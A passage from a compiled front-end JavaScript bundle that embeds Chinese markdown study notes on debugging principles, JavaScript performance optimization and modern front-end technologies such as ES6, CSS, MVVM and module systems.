编译器和链接器等\r\n\r\n### 2、制造失败\r\n\r\n- 原因\r\n\r\n\t- 可以观察失败时的具体情况\r\n\t- 可以专心查找原因，准确地知道问题在什么条件下发生\r\n\r\n\t\t- 应从各个因素考虑\r\n\r\n\t- 可以判断bug是否已经被修复\r\n\r\n- 注意点\r\n\r\n\t- 从头开始\r\n\r\n\t\t- 因为有的bug 仅仅在某个复杂的状态下才发生，因此必须仔细注意机器在执行各个步骤时的状态\r\n\r\n\t- 不要模拟失败（也就是模拟失败机理本身，如书中写的保存文档丢失图片的例子），而是引发失败（也就是模拟发生失败的条件，如放大效果法---书中提到的窗户喷水 或者自动化(过程/测试)法---书中提到的自动移动仪器的例子）\r\n\t- 在引发失败时不要画蛇添足\r\n\t- 不要 轻易说出“那不可能发生”\r\n\r\n\t\t- 汽车启动 和冰淇淋的例子\r\n\r\n\t- 永远不要丢掉调试（测试）工具\r\n\r\n- 如何处理间歇性bug\r\n\r\n\t- 出现间歇性bug的原因\r\n\r\n\t\t- 存在你没注意到或者无法控制的因素，如初始条件、输入数据等（没完全弄清楚失败是如何发生的，不知道完整的、准确的条件）\r\n\t\t- 测试者是否清醒\r\n\r\n\t- 找到那些你没有注意到或者不可控的可能的影响因子，并大量测试这些影响因子的不同状态或条件\r\n\t- （1、查找不受你控制的条件；2、记录每一件事情，并找到间歇性bug的特征）\r\n\r\n- 如果做了所有尝试，间歇性bug还存在\r\n\r\n\t- 仔细观察失败\r\n\t- 不要盲目的相信统计数据\r\n\t- 是bug已经修复了 还是运气好导致它暂时没有发生\r\n\r\n### 3、不要想（猜测），而要看\r\n\r\n- 观察失败\r\n\r\n\t- 一定要亲眼看到bug发生的实际情况，而不是靠猜测，观察往往比猜测更快的找到答案；猜测虽然看起来是个捷径，但它不会带你找到问题的根源\r\n\r\n\t\t- 楼栋管理员把插座拔掉的例子\r\n\t\t- 换新水泵的例子\r\n\r\n- 查看细节\r\n\r\n\t- 一直观察，直到把问题的原因锁定在几种可能性之内\r\n\r\n- 问题忽隐忽现\r\n\r\n\t- 在调试间歇性bug时，观察底层的失败细节有一个好处就是 看到底层的失败细节后，当你认为已修复bug时，很容易证明确实已修复，你不必依靠统计数据就可以看到错误不再发生。\r\n\r\n- 对系统进行插装\r\n\r\n\t- 设计插装工具（测试点）\r\n\r\n\t\t- 调试模式编译的情况下\r\n\r\n\t\t\t- 源代码调试器来观察程序的运行\r\n\r\n\t\t- 发布模式编译的情况下\r\n\r\n\t\t\t- 在性能监视器中输入各种有意义的变量，以便在运行时观察它们\r\n\r\n\t- 过后构建插装\r\n\t- 不要害怕深入研究\r\n\t- 添加外部插装\r\n\t- 日常生活中的插装\r\n\r\n\t\t- 体温计\r\n\t\t- X光透视\r\n\t\t- 水温计、压力计\r\n\r\n- 海森堡 测不准原理\r\n\r\n\t- 测量一个粒子的位置和测量它向哪个位置运动，这两者当中有一个测量得越精确，另一个就越测不准\r\n\t- 不要让仪器影响了系统\r\n\r\n- 猜测只是为了确定搜索的重点目标\r\n\r\n\t- 不要想，而要看并不是真的意味着不能做任何猜想\r\n\t- 不要过分相信你的猜测，它们往往偏离了方向\r\n\t- 例外的情况：如果某些问题比其他问题更容易出现（出现的概率大）或者比其他问题更易于修复，则应该首先检查这些问题；（易发生且易修复，则可以直接尝试修复它，而不需要真正看到失败的细节）\r\n\r\n\t\t- 灯不亮的例子\r\n\r\n\t\t\t- 灯或者开关坏了\r\n\r\n\t\t- 电热水器的例子\r\n\r\n\t\t\t- 内部保险丝或者跳闸了\r\n\r\n### 4、分而治之\r\n\r\n- 缩小搜索范围\r\n\r\n\t- 确定范围\r\n\t- 确定你位于bug的哪一侧\r\n\r\n\t\t- 如果你所在的位置有排放物。则排放管就在上游，如果没有，则在下游\r\n\r\n- 插入易于识别的模式\r\n\r\n\t- 从干净、清澈的水开始，以便当排放物进入河流中时很容易看到它\r\n\r\n- 从有问题的分支开始查找问题\r\n\r\n\t- 如果从正确的部分开始验证，那么需要验证的地方太多了\r\n\r\n- 修复已知的bug\r\n\r\n\t- bug相互保护，相互隐藏\r\n\r\n- 首先消除噪音干扰\r\n\r\n### 5、一次只改一个地方\r\n\r\n- 使用步枪而不是用散弹枪（控制变量法）\r\n- 用双手抓住黄铜杆（核潜艇）\r\n\r\n\t- 如果不清楚具体发生了什么问题就试图修复bug，会很危险！\r\n\r\n- 一次只改变一个测试\r\n\r\n\t- 如果所做的更改没有起到预期作用 应该把它改回去（  汽车不启动的例子--N档 P档 钥匙没有转到位 ）\r\n\r\n- 与正常系统进行对比\r\n- 确定自从上次正常工作以来你改变了什么\r\n\r\n\t- 不一定是最近一次的修改导致的，有可能很早就影响了\r\n\t- 唱片机 唱头的例子\r\n\r\n### 6、跟踪记录(保持审计跟踪)\r\n\r\n- 记下你的每次操作、顺序和结果\r\n\r\n\t- 要描述的非常清楚，以实物过敏为例，什么时候吃了什么有什么反应等\r\n\r\n- 魔鬼隐藏在细节中\r\n\r\n\t- 没穿鞋子 感到电击 的例子\r\n\t- 视频压缩芯片崩溃是由于格子寸衫造成的例子\r\n\r\n- 把事件关联到一起\r\n\r\n\t- 将某些症状与其他症状或调试信息关联起来是非常有用的\r\n\r\n- 用于设计的 审计跟踪（指源代码版本管理工具） 在测试中也非常有用\r\n- 好记性不如烂笔头\r\n\r\n### 7、检查是否犯了哪些低级错误 (检查插头)\r\n\r\n- 怀疑自己的假设\r\n\r\n\t- 通常，问题发生在较低的层次上，也就是你可能犯了低级错误，如汽车启动不了 可能是没油了，而不是化油器的问题\r\n\r\n- 从头开始检查\r\n\r\n\t- 如 使用除草机之前，你是否按了3次primer\r\n\r\n- 对工具进行测试\r\n\r\n\t- 编译器是否是二进制的例子\r\n\t- 燃料油表是否被粘住了的例子\r\n\r\n### 8、 求助( 获取全新观点)\r\n\r\n- 寻求帮助\r\n\r\n\t- 获得全新观点\r\n\r\n\t\t- 有时候向别人解释问题也会使你有全新的认识，因为对事件进行组织的过程迫使你跳出你原来的思维模式（（这里有点类似 小黄鸭调试法））\r\n\r\n\t- 询问专家\r\n\t- 听取别人的经验\r\n\r\n\t\t- 刹车灯保险丝断掉 跟车顶灯线露出的例子\r\n\t\t- 维修机器，敲击方法的例子\r\n\r\n- 到哪里寻求帮助\r\n\r\n\t- 同事\r\n\t- 供应商\r\n\t- 网络\r\n\t- 书店\r\n\r\n- 放下面子\r\n\r\n\t- 专家也可能出错\r\n\t- 以除掉bug为自豪，而不要非得以自己除掉bug才为自豪\r\n\r\n- 报名症状而不是理论\r\n\r\n\t- 不要把理论告诉帮助你的人而是现象，否则他可能被你拉到你的思维定势中，导致有些关键的细节被忽略了\r\n\r\n- 把症状的每个细节也描述清楚并别遗漏了\r\n- 让帮助你的人复现bug\r\n- 即使不十分肯定也可以提出来\r\n\r\n### 9、如果你不修复bug，它将依然存在\r\n\r\n- 检查问题确实已经被修复\r\n\r\n\t- 汽车低档位熄火的例子---原因是滤油器而不是线路问题\r\n\r\n- 检查确实是修复措施解决了问题\r\n\r\n\t- 检查方法是 你修复了问题后，取消这个修复，看bug是否再现，如果再现了，再把修复加上，再次验证问题是否已被修复\r\n\r\n- bug从来不会自己消失\r\n- 从根本上解决问题\r\n\r\n\t- 收音机变压器的例子\r\n\r\n- 对过程进行修复\r\n\r\n\t- 不要只是擦掉地上的油，而是要纠正设计机器的方式（四个螺钉而不是两个）\r\n\r\n",ps={data:function(){return{MainComponent:cs}}},us=ps,ms=Object(u["a"])(us,os,ls,!1,null,"2c8612ee",null),ds=ms.exports,gs=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},bs=[],vs='# 性能\r\n\r\n## 程序性能\r\n\r\n### Web Worker\r\n\r\n- JavaScript 当前并没有任何支持多线程执行的功能。\r\n- 程序中每一个这样的独立的多线程部分被称为一个（Web）Worker\r\n- Worker 之间以及它们和主程序之间，不会共享任何作用域或资源\r\n- 专用 Worker 和创建它的程序之间是一对一的关系，通过 meaasge 通信\r\n- 在 Worker 内部是无法访问主程序的任何资源的\r\n- 以执行网络操 作（Ajax、WebSockets）以及设定定时 器\r\n- 可以访问几个重要的全局变量和功能的本地复 本\r\n- 需要在线程之间通过事件机制传递大量的信息，可能是双向的\r\n- SharedWorker 可以共享的中心 worker\r\n- 在共享 Worker 内部，必须要处理额外的一个事件："connect"\r\n\r\n### 　SIMD\r\n\r\n- 单指令多数据（SIMD）是一种数据并行 （data parallelism）方式\r\n- SIMD JavaScript 计划向 JavaScript 代码暴露短向量类型和 API\r\n\r\n### asm.js\r\n\r\n- asm.js（http://asmjs.org ）这个标签是指 JavaScript 语言中可以高度优化的一个子集。\r\n- 现有的程序可以从asm.js 风格的优化得益而无需特意做什么\r\n- 关于 asm.js 优化，首先要理解的是类型和强制类型转换\r\n- var a= 42；var b = a | 0;\r\n- 对 JavaScript 性能影响最大的因素是内存分配、垃圾收集和作用域访问。\r\n- 对特定的任务处理提供一种优化方法，比如数学运算\r\n\r\n## 性能测试与调优\r\n\r\n### 性能测试\r\n\r\n- 简单的数学平均值绝对不足以对你要外推到整个应用范围的性能作出判断\r\n- 一个统计学上有效的性能测试工具，名为 Benchmark.js\r\n\r\n### 　环境为王\r\n\r\n- 现代引擎要比我们凭直觉进行的推导复杂得多\r\n- 引擎可能不会优化这样无关紧要的代码，但是在系统已经在运行更复杂的程序时可能会\r\n- 倾向于激进的优化。\r\n\r\n### jsPerf.com\r\n\r\n- 交叉引用多个浏览器上的测试运行结果\r\n- 测试结果就会被收集并持久化，累积的测试结果会被图形化\r\n\r\n### 写好测试\r\n\r\n- 要写好测试，需要认真分析和思考两个测试用例之间有什么区别，以及这些区别是有意 还是无意 的\r\n- 编写更好更清晰的测试\r\n- 不要试图窄化到真实代码的微小片段\r\n\r\n### 微性能\r\n\r\n- 有时候编译器可能会决定执行与你所写的不同的代码，不只是顺序不同，实际内容也会不同\r\n- 花费在优化关键路径上的时间不是浪费，不管节省的时间多么少\r\n- 而花在非关键路径优化上的时间都不值得，不管节省的时间多么多\r\n\r\n### 尾调用优化\r\n\r\n- 尾调用就是一个出现在另一个函数“结尾”处的函数调用\r\n- 调用一个新的函数需要额外的一块预留内存来管理调用栈，称为栈帧，尾部调用可以使用上一个函数的栈帧\r\n- 有了 TCO，尾调用的递归函数本质上就可以任意运行，因为再也不需要使用额外的内存！\r\n\r\n## JavaScript性能\r\n\r\n### 脚本阻塞\r\n\r\n- 减少JavaScript文件大小并限制HTTP请求数量\r\n- 将外链JavaScript放置页面底部加载\r\n- defer: 本元素所含的脚本不会修改,因此代码能安全地延迟执行，页面加载完成后执行\r\n- async：下载完成后自动执行，采用并行下载，下载过程中不会发生阻塞（同defer）\r\n- 动态脚本加载：操作DOM添加 script，所有的外链都是非阻塞加载，且加载完后会立即执行（FireFox和Opera会等所有动态脚本元素加载完后再执行）\r\n- IE中的script标签加载生命周期,只需监测带星号的状态\r\n\r\n\t- uninitialized\r\n\t- loading\r\n\t- loaded(*)\r\n\t- interactive\r\n\t- complete(*)\r\n\r\n### 数据存取\r\n\r\n- 作用域\r\n\r\n\t- 全局作用域\r\n\t- 局部作用域\r\n\r\n\t\t- 函数作用域\r\n\r\n\t\t\t- 创建函数时，它的作用域链插入了一个对象变量，这个对象变量包含该作用域下声明的所有的变量\r\n\t\t\t- 执行函数时，创建一个执行环境（执行上下文），执行结束执行环境就被销毁。（call stack）\r\n\r\n\t\t- 块状语句\r\n\r\n\t- 作用域链\r\n\r\n\t\t- 每个执行环境都有自己的作用域链，用解析标识符，如果当前作用域没有该标识符，则在上一级作用域查询，直到全局作用域。查询结束后，会创建一个活动对象（作为函数运行时的变量对象，然后此对象被推入作用域链最前端；执行环境被销毁，活动对象也随之销毁），正是这个查询过程影响了性能。\r\n\r\n\t- 改变作用域链\r\n\r\n\t\t- try...catch\r\n\r\n\t\t\t- catch语句会把错误对象推入作用域链最前端\r\n\r\n\t\t- with\r\n\r\n\t\t\t- 创建一个新的变量对象并将其推入作用域链最前端\r\n\r\n\t\t- eval\r\n\r\n\t\t\t- 动态作用域\r\n\r\n- 闭包\r\n\r\n\t- 闭包的[[scope]]属性包含了与执行环境作用域链相同的对象引用。函数的活动对象会随着执行环境一起销毁，但引入闭包后，由于引用仍然存在于闭包的[[scope]]属性中，所以此活动对象无法被销毁。\r\n\r\n- 原型\r\n\r\n\t- 原型、原型链可参照作用域链，表现和原理极其类似。\r\n\r\n### 算法和流程控制\r\n\r\n- 循环\r\n\r\n\t- 过程式\r\n\r\n\t\t- for in（也会遍历原型属性，bad）\r\n\t\t- for\r\n\t\t- while\r\n\t\t- do while\r\n\t\t- for of（ES6）\r\n\r\n\t- 基于函数的迭代普遍慢于过程式迭代\r\n\t- 避免for in，减少每次迭代处理的事务，减少迭代的次数\r\n\r\n- 条件语句和查找表\r\n\r\n\t- 根据场景需要，选择合适的方案。通常switch优于ifelsel，当判断条件很多时，使用查找表更优。\r\n\r\n- 递归和迭代\r\n\r\n\t- 大多数浏览器有调用栈限制，考虑用迭代替代一些递归\r\n\t- 缓存前一个计算结果供后续计算使用\r\n\r\n### 管理JavaScript运行时间\r\n\r\n- 浏览器UI线程（单线程）\r\n\r\n\t- 执行JavaScript代码\r\n\t- 更新用户界面（重排重绘）\r\n\r\n- 定时器\r\n\r\n\t- 用定时器将执行JavaScript代码的时间让给浏览器更新UI，然后再执行JavaScript代码\r\n\t- 注意事项\r\n\r\n\t\t- 设置的时间只是说明，在那个时间后 定时器绑定的事件才加入任务队列，并非是执行该事件。\r\n\r\n\t- 将耗时长的任务分割为一堆子任务\r\n\r\n- Web Workers\r\n\r\n\t- 未绑定UI线程，所以可在UI线程外执行特定的代码\r\n\t- 通过postMessage message来进行页面与Web Workers的通信\r\n\r\n- 注意事项\r\n\r\n\t- JavaScript脚本运行时间不应超过100ms\r\n\r\n### 事件循环\r\n\r\n- https://geniusfunny.github.io/2018/06/27/event-loop/\r\n\r\n### Ajax\r\n\r\n- 数据传输\r\n\r\n\t- 请求数据\r\n\r\n\t\t- 动态脚本注入\r\n\t\t- XMLHttpRequest\r\n\t\t- Multipart XHR\r\n\r\n\t\t\t- 无法缓存\r\n\t\t\t- 通过readystate为3来进行XHR流式处理\r\n\r\n\t- 发送数据\r\n\r\n\t\t- XHR\r\n\t\t- 信标（Beancons）\r\n\r\n- 数据格式\r\n\r\n\t- XML\r\n\t- Xpath\r\n\t- JSON\r\n\t- JSON-P\r\n\t- HTML\r\n\t- 自定义格式\r\n\r\n- 性能指南\r\n\r\n\t- 数据缓存\r\n\r\n\t\t- 设置HTTP头信息\r\n\t\t- 本地数据存储\r\n\r\n### 编程实践\r\n\r\n- 双重求值\r\n\r\n\t- 在程序中提取一个包含代码的字符串，然后动态执行它。\r\n\r\n- 使用Object/Array直接量\r\n- 延迟加载\r\n\r\n\t- 当一个函数在页面不会立刻调用时\r\n\r\n- 条件预加载\r\n\r\n\t- 当一个函数马上就要用到并且整个页面周期中频繁出现\r\n\r\n- 使用语言中快速的一部分\r\n\r\n\t- 位操作\r\n\t- 原生方法\r\n\r\n###  构建及部署\r\n\r\n- 合并多个JavaScript文件以减少HTTP请求\r\n- JavaScript压缩（剥离与运行无关的代码）\r\n- 在服务器端压缩JavaScript文件（Gzip）\r\n- 设置HTTP响应头来缓存JavaScript文件（协商缓存、强制缓存）\r\n- 使用CDN（内容分发网络）提供JavaScript文件\r\n\r\n## 前端性能指南\r\n\r\n### 减少HTTP请求\r\n\r\n- 图片\r\n\r\n\t- 图片地图（合并图片，一张图片上关联多个url，目标url取决于用户点击图片位置，常见于导航栏）\r\n\t- CSS Sprites（合并图片，然后使用background-position将HTML元素放到背景图片中期望的位置）\r\n\t- 内联图片（data:URL，有大小限制且比转化后比占据空间比原图大1/3，内联在页面时不会被缓存，但可缓存在样式表内部）\r\n\r\n- 合并脚本和样式表\r\n\r\n\t- 多个脚本合并为1个脚本，多个样式表合并为1个样式表\r\n\r\n### 使用内容分发网络（CDN）\r\n\r\n- CDN是一组分布在多个不同地理位置的Web服务器\r\n- 就近访问、全局负载均衡流量\r\n- 其目的是通过在现有的Internet中增加一层新的网络架构，将网站的内容发布到最接近用户的网络"边缘"，使用户可以就近取得所需的内容，解决Internet网络拥塞状况，提高用户访问网站的响应速度。\r\n\r\n### 使用浏览器缓存(Cache-Control/Expires)\r\n\r\n### 压缩\r\n\r\n- Accept-Encoding: gzip, deflate\r\n- 考虑代理缓存及浏览器压缩支持\r\n\r\n### 将样式表放置顶部\r\n\r\n- 在样式表还在加载中时，浏览器不会构建呈现树。（详情见页面构建流程）\r\n\r\n### 将脚本放在底部\r\n\r\n- HTTP1.1规范建议一个主机名只能并行下载2个资源（除脚本），所以将资源分布到多个主机名（建议2个，更多的并行下载会消耗更多的CPU、网络）。\r\n- 脚本可能会使用document.write等方法修改页面内容，所以浏览器会等待，确保页面能够适当的布局。\r\n\r\n### 避免CSS表达式\r\n\r\n### 使用外部JavaScript和CSS\r\n\r\n- 外部JavaScript和CSS可以被浏览器缓存\r\n- 左右因素：页面浏览量、空缓存vs完整缓存、组件重用\r\n- 加载后下载：页面加载后，通过创建对应的DOM元素并赋予指定的URL来实现\r\n- 动态内联：通过cookie来反馈浏览器中的缓存给服务端，供其智能匹配内联/外部\r\n\r\n### 通过使用Keep-Alive和较少的域名来减少DNS查询\r\n\r\n### 精简JavaScript代码（删除空白字符、注释）、混淆JavaScript代码（除此之外会修改原代码）\r\n\r\n### 避免重定向（redirect会阻塞所有请求）\r\n\r\n### 去除重复的JavaScript脚本\r\n\r\n## 只有10%～20%的最终用户响应时间花在接受所请求的HTML文档上，剩余80%～90%的时间花在为HTML文档所引用的所有组件（图片、脚本、样式表、Flash等）\r\n\r\n',hs={data:function(){return{MainComponent:vs}}},Ss=hs,ys=Object(u["a"])(Ss,gs,bs,!1,null,"3217204f",null),fs=ys.exports,_s=function(){var n=this,r=n.$createElement,t=n._self._c||r;return t("div",{},[t("q-markdown",{attrs:{src:n.MainComponent}})],1)},xs=[],ws="## 现代前端技术解析\r\n\r\n### 前端与协议\r\n\r\n- HTTP协议\r\n- 前端实时协议\r\n\r\n\t- WebSocket通信机制\r\n\t- Poll(轮询)和Long-poll(长轮询)\r\n\r\n\t\t- Poll即浏览器采用定时向服务器发送请求轮询的方法不断发送或拉取消息。\r\n\t\t- HTTP请求可以设置一个较长的Timeout等待时间，这样网络轮询请求就可以维持一段较长的时间后返回结果，这也就是Long-poll（长轮询）的基本思路。服务器只要在这段长轮询时间内进行响应，请求便会立即返回结果；如果这段时间服务器没有返回，浏览器端将自动响应超时并重新发起一个长轮询请求。\r\n\r\n\t- 前端DDP协议\r\n\r\n\t\t- DDP（Distributed Data Protocol，分布式数据协议）是一种新型的客户端与服务器端的实时通信协议，由于兼容性的原因，目前使用还不广泛。\r\n\r\n- RESTful数据协议规范\r\n\r\n\t- REST（Representational State Transfer，表述性状态转化）并不是某一种具体的协议，而是定义了一种网络应用软件之间的架构关系并提出了一套与之对应的网络之间交互调用的规则。\r\n\t- 换种方式理解，RESTful是一种软件架构之间交互调用数据的协议风格规范，它建议以一种通用的方式来定义和管理数据交互调用接口。\r\n\r\n- 与Native交互协议\r\n\r\n### 前端三层结构与应用\r\n\r\n- HTML结构层基础\r\n\r\n\t- Web语义化标签\r\n\r\n\t\t- 用正确的标签做正确的事情。\r\n\t\t- HTML语义化能让页面内容更具结构化且更加清晰，便于浏览器和搜索引擎进行解析，因此在兼容条件下，要尽量使用带有语义化结构标签。\r\n\t\t- 即使在没有样式CSS的情况下，网页内容也应该是有序的文档格式显示，并且是容易阅读的。\r\n\t\t- 使项目维护人员更容易对网站进行分块，便于阅读理解。语义化的标签使用，能让开发者更容易区分标签元素中的内容\r\n\r\n\t- HTML糟糕的部分\r\n\r\n\t\t- Web语义化规范并不是在任何时候都需要严格遵守的，有时直接使用甚至会产生一些副作用。\r\n\r\n\t- AMP HTML\r\n\r\n\t\t- 流动网页提速（Accelerated Mobile Pages，AMP）是google推行的一个提升页面资源载入效率的HTML提议规范。基本思路有两点：使用严格受限的高效HTML标签以及使用静态网页缓存技术来提高网络访问静态资源的性能和用户体验。\r\n\r\n- 前端结构层演进\r\n\r\n\t- XML与HTML简述\r\n\r\n\t\t- 可扩展标记语言（Extentsible Markup Language，XML）是用来描述网络上存储数据的一种特殊文本标记格式。\r\n\t\t- HTML则是从SGML的基础上演化而来的另一种文本标记语言，一般用于网络上数据的展示。\r\n\r\n\t- HTML5标准\r\n\t- HTML Web Component\r\n\r\n- 浏览器脚本演进历史\r\n\r\n\t- CoffeeScript时代 --\x3e ECMAScript标准概述 --\x3e TypeScript概述 --\x3e JavaScript衍生脚本\r\n\r\n- JavaScript标准实践\r\n\r\n\t- ES5\r\n\t- ES6\r\n\r\n\t\t- let和const使用场景：模块内不变的引用和常量，一般使用const定义；可变的变量或引用使用let声明；var仅用于声明函数整个作用域内需要使用的变量。\r\n\t\t- 字符串模板\r\n\t\t- 解构赋值\r\n\t\t- 数组新特性\r\n\t\t- 函数参数\r\n\r\n\t\t\t- 默认参数\r\n\t\t\t- 不定参数\r\n\t\t\t- 扩展参数\r\n\r\n\t\t- 箭头函数\r\n\t\t- 增强对象\r\n\t\t- 类\r\n\t\t- 模块module\r\n\t\t- 循环与迭代器Iterator\r\n\r\n\t\t\t- for...of\r\n\t\t\t- Iterator\r\n\r\n\t\t- 生成器Generator\r\n\t\t- 集合类型Map+Set+WeakMap+WeakSet\r\n\t\t- Promise、Symbol、Proxy增强类型\r\n\t\t- 统一码\r\n\t\t- 进制数支持\r\n\r\n\t\t\t- 二进制（b）\r\n\t\t\t- 八进制（o）\r\n\r\n\t\t- Reflect对象和tail calls尾调用\r\n\r\n\t- ES7+\r\n\r\n\t\t- 幂指数操作符**\r\n\t\t- Array.prototype.includes\r\n\t\t- 异步函数async/await\r\n\t\t- SIMD\r\n\r\n\t- TypeScript\r\n\r\n\t\t- 强类型支持\r\n\t\t- Decorator装饰器特性\r\n\r\n- 前端表现层基础\r\n\r\n\t- CSS选择器与属性\r\n\r\n\t\t- CSS选择器\r\n\r\n\t\t\t- CSS中选择器属性优先级顺序为！important>内联样式（权重1000）> id选择器（权重100）>类选择器（权重10）>元素选择器（权重1）\r\n\t\t\t- 伪元素：::before，::after\r\n\t\t\t- 伪类：visited、:hover、:first-child、:nth-child、:enable、:checked\r\n\r\n\t\t- CSS属性\r\n\r\n\t\t\t- 布局类属性：position类、弹性布局fex、浮动float、对齐align\r\n\t\t\t- 几何类属性：盒模型相关（margin、padding、width、heigh、border）、box-shadow、渐变gradient、backgroud类、transform类\r\n\t\t\t- 文本类属性：font类、line-height、color类、text类（text-decoration、text-indent、textoverflow）、white-space、user-select、text-shawdow等\r\n\t\t\t- 动画类属性：以css3为主的transition、animation等\r\n\t\t\t- 查询类：Media query和IE Hack等\r\n\r\n- 前端界面技术\r\n\r\n\t- CSS样式统一化\r\n\r\n\t\t- reset：将不同浏览器中标签元素的默认样式全部清除，消除不同浏览器下默认样式的差异性\r\n\t\t- normalize：在整站样式基本确定的情况下对标签元素统一使用同一个默认样式规则\r\n\t\t- neat\r\n\r\n\t- css预处理\r\n\r\n\t\t- 预处理技术\r\n\r\n\t\t\t- sass\r\n\t\t\t- less\r\n\t\t\t- stylus\r\n\t\t\t- postCss：是一个用 JavaScript 工具和插件转换 CSS 代码的工具\r\n\r\n\t\t- 预处理工具特性\r\n\r\n\t\t\t- 变量声明和计算。方便一次赋值和随处使用，并能进行简单运算，提高开发管理效率。\r\n\t\t\t- 语法表达式。例如if-else条件语句、for循环等简单语法的设计能让页面CSS规则的生成更加灵活。\r\n\t\t\t- 函数处理。方便多次计算的地方能统一复用，例如函数处理和Mixin等特性。\r\n\t\t\t- 属性的继承。元素类属性的继承在开发样式相似但略微不同的多个模块的过程中非常有用，可以减少大量重复代码。\r\n\t\t\t- 兼容性补全。类似autoprefixer这种功能，让开发者不用过多关注不同浏览器的兼容问题，处理多个浏览器兼容性的代码能在预处理阶段自动生成补全，让一些问题的处理方式对开发者透明。\r\n\r\n\t- 表现层动画实现\r\n\r\n\t\t- JavaScript直接实现动画：其主要思想是通过JavaScript的setInterval方法或setTimeout方法的回调函数来持续调用改变某个元素的CSS样式以达到元素样式持续变化的结果\r\n\t\t- 可伸缩矢量图形（Scalable Vector Graphics，SVG）动画\r\n\t\t- CSS3 transition\r\n\t\t- CSS3 animation\r\n\t\t- Canvas动画\r\n\t\t- requestAnimationFrame\r\n\r\n- 响应式网站开发技术\r\n\r\n\t- 响应式页面实现概述\r\n\r\n\t\t- 实现方法\r\n\r\n\t\t\t- 通过前端或后端判断userAgent来跳转不同的页面完成不同设备浏览器的适配，也就是维护两个不同的站点来根据用户设备进行对应的跳转\r\n\t\t\t- 使用media query媒体查询等手段，让页面根据不同设备浏览器自动改变页面的布局和显示，但不做跳转\r\n\r\n\t- 结构层响应式\r\n\r\n\t\t- 结构层数据内容响应式：根据不同平台浏览器的情况加载不同的异步静态JavaScript，然后异步渲染不同的模块内容，生成不同的表现层结构来实现\r\n\t\t- 后端数据渲染响应式\r\n\t\t- 结构层媒体响应式\r\n\r\n\t- 表现层响应式\r\n\r\n\t\t- 响应式布局：\r\n\r\n\t\t\t- 一种是桌面端浏览器优先，扩展到移动端浏览器适配\r\n\t\t\t- 另一种则是以移动端浏览器优先，扩展到桌面端浏览器适配\r\n\r\n\t\t- 屏幕适配布局：在移动端解决内容按照不同屏幕大小自动等比例缩放的一种布局计算方式\r\n\r\n\t- 行为层响应式\r\n\r\n### 现代前端交互框架\r\n\r\n- 直接DOM操作时代\r\n\r\n\t- 节点查询型：getElementById、getElementsByName、getElementsByClassName、getElementsByTagName、querySelector、querySelectorAll\r\n\t- 节点创建型：createElement、createDocumentFragment、createTextNode、cloneNode\r\n\t- 节点修改型：appendChild、replaceChild、removeChild、insertBefore、innerHTML\r\n\t- 节点关系型：parentNode、previousSibling、childNodes\r\n\t- 节点属性型：innerHTML、attributes、getAttribute、setAttribute、getComputedStyle\r\n\t- 内容加载型：XMLHttpRequest、ActiveX\r\n\r\n- MV*交互模式\r\n\r\n\t- 前端MVC模式\r\n\t- 前端MVP模式\r\n\t- 前端MVVM模式\r\n\t- 数据变更检测示例\r\n\r\n\t\t- 手动触发绑定\r\n\t\t- 脏检测机制\r\n\t\t- 前端数据对象劫持(Hijacking)\r\n\t\t- ECMAScript 6 Proxy\r\n\r\n- Virtual DOM交互模式\r\n\r\n\t- Virtual DOM设计理念\r\n\t- Virtual DOM的核心实现\r\n\r\n\t\t- 创建Virtual DOM：把一段HTML字符串文本解析成一个能够描述它的JavaScript对象\r\n\t\t- 对比两个Virtual DOM生成差异化Virtual DOM\r\n\t\t- 将差异化Virtual DOM渲染到页面上\r\n\r\n- 前端MNV*时代\r\n\r\n\t- MNV*模式简介：这种使用JavaScript调用原生控件或事件绑定来生成应用程序的交互模式称为前端MNV＊开发模式\r\n\t- MNV*模式实现原理\r\n\r\n### 前端项目与技术实践\r\n\r\n- 前端开发规范\r\n- 前端组件规范\r\n\r\n\t- UI组件规范\r\n\r\n\t\t- UI层风格统一化。UI层风格统一化避免了不同页面的差异化设计风格，能让用户使用Web站点的不同网页外观风格是一致的。\r\n\t\t- 增加UI层复用性。使用UI规范的情况下，UI层代码复用性增强，可以提高开发效率，相同功能的结构和样式不用重复实现。\r\n\t\t- 更符合用户的体验习惯。例如红色按钮统一用来表示警告，绿色按钮统一表示安全或成功操作等。\r\n\t\t- 增加了开发规范的统一性。遵循统一的规范，避免重复开发，避免产生多种风格的代码。\r\n\r\n\t- 模块化规范\r\n\r\n\t\t- AMD（异步模块定义）：AMD是运行在浏览器端的模块化异步加载规范，主要以requireJS为代表，基本原理是定义define和require方法异步请求对应的javascript模块文件到浏览器端运行。模块执行导出时可以使用函数中的return返回结果。\r\n\t\t- CMD（通用模块定义）：CMD是Seajs提出的一种模块化规范，在浏览器端调用类似CommonJS的书写方式来进行模块引用，但却不是完全的CommonJS规范。\r\nCMD遵循按需执行依赖的原则\r\n\t\t- CommonJS：CommonJS是Node端使用的JavaScript模块化规范，使用require进行模块引入，并使用modules.exports来定义模块导出。\r\n\t\t- import/export\r\n\r\n\t- 项目组件化设计规范\r\n\r\n\t\t- Web Component组件化\r\n\t\t- MVVM框架组件化\r\n\t\t- Virtual DOM的组件化方案\r\n\t\t- 基于目录管理的通用组件化实践\r\n\r\n- 自动化构建\r\n\r\n\t- 自动化构建的目的：对文件进行模块化引入、依赖分析、资源合并、压缩优化、文件嵌入、路径替换、生成资源包等多种操作，这样就能完成很多原本需要手动完成的事情，极大地提高开发效率\r\n\t- 自动化构建原理：读取入口文件→分析模块引用→按照引用加载模块→模块文件编译处理→模块文件合并→文件优化处理→写入生成目录\r\n\t- 构建工具设计的问题\r\n\r\n\t\t- 模块分析引入\r\n\t\t- 模块化规范支持\r\n\t\t- CSS编译、自动合并图片\r\n\t\t- HTML、JavaScript、CSS资源压缩优化\r\n\t\t- HTML路径分析替换\r\n\t\t- 区分开发和上线目录环境\r\n\t\t- 异步文件打包方案\r\n\t\t- 文件目录白名单设置\r\n\r\n- 前端性能优化\r\n\r\n\t- 前端性能测试\r\n\t- 桌面浏览器前端优化策略\r\n\t- 移动端浏览器前端优化\r\n\r\n- 前端用户数据分析\r\n\r\n\t- 用户访问统计\r\n\t- 用户行为分析\r\n\t- 前端日志上报\r\n\t- 前端性能分析上报\r\n\r\n- 前端搜索引擎优化基础\r\n- 前端协作\r\n\r\n## 高效的组件化规范\r\n\r\n### 组件之间独立、松耦合。组件之间的HTML、JavaScript、CSS之间相互独立，尽量不重复，相同部分通过父级或基础组件来实现，最大限度减少重复代码。\r\n\r\n### 